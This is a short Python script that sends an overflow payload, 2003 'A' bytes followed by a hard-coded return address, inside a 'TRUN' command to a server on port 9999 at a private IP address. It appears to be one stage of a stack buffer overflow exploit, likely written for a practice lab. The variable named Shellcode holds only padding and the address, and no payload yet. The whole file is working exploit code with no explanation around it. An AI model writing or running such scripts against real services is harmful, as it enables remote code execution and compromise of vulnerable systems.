#!/bin/python
import sys, socket

"Ret address=>625011AF"	
Shellcode="A" * 2003 + "\xaf\x11\x50\x62"

try: 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(('192.168.1.133',9999))
     print("Sending pattern to Remote server....." )
     s.send(('TRUN /.:/'+ Shellcode))
     s.close()
           
except: 
     print("Error in connecting")
     sys.exit()
                   